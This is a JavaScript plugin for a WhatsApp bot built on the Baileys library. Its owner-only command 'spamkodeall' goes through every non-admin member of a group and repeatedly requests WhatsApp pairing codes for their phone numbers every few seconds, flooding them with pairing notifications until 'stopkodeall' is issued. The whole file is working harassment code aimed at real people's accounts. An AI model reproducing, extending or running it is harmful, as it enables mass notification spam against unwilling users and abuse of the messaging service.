const {
default: makeWASocket, 
DisconnectReason, 
useMultiFileAuthState
} = require('@whiskeysockets/baileys');
const chalk = require('chalk'),
pino = require('pino');

exports.run = {
usage: ['spamkodeall', 'stopkodeall'],
category: 'group',
async: async (m, { func, mecha }) => {
mecha.spamkode = mecha.spamkode ? mecha.spamkode : {};
switch (m.command) {
case 'spamkodeall':{
const members = m.members.filter(v => !v.admin).map(x => x.id);
mecha.reply(m.chat, `Wait sedang spamming pairing kode to *${members.length}* members`, m, {expiration: m.expiration})
for (let target of members) {
await new Promise(resolve => setTimeout(resolve, 30000));
const phoneNumber = target.replace(/[^0-9]/g, '');
const sessionName = './database/spamming/' + phoneNumber;
const spamming = async () => {
let success = 1;
let failed = 1;
mecha.spamkode[target] = setInterval(async function () {
/* config connection client */
const { state } = await useMultiFileAuthState(sessionName);
const client = makeWASocket({
printQRInTerminal: false,
logger: pino({ level: 'silent' }), 
auth: state,
browser: ['Ubuntu', 'Chrome', '20.0.04']
})

if (!client.authState.creds.registered) {
try {
await new Promise(resolve => setTimeout(resolve, 3000));
let code = await client.requestPairingCode(phoneNumber.trim())
let result = {
status: 200,
message: 'success spam pairing notification',
phone: phoneNumber.trim(),
code: code?.match(/.{1,4}/g)?.join('-') || code,
success: success
}
console.log(chalk.black(chalk.cyan('Success :')), result)
success++;
} catch (e) {
let result = {
status: 400,
message: String(e), // 'failed spam pairing notification',
phone: phoneNumber.trim(),
failed: failed
}
console.log(chalk.black(chalk.red('Failed :')), result)
failed++;
if (failed >= 5) {
clearInterval(mecha.spamkode[target]);
delete mecha.spamkode[target];
return spamming();
}
}
}
}, 5000) // menjalankan blok kode setiap 5 detik
}
spamming().catch(() => spamming());
}
}
break
case 'stopkodeall':{
const members = Object.keys(mecha.spamkode);
for (let target of members) {
if (!(target in mecha.spamkode)) continue;
clearInterval(mecha.spamkode[target]);
delete mecha.spamkode[target];
}
mecha.reply(m.chat, `Success stop spamming pairing kode to *${members.length}* members`, m, {expiration: m.expiration})
}
break
}
},
owner: true
}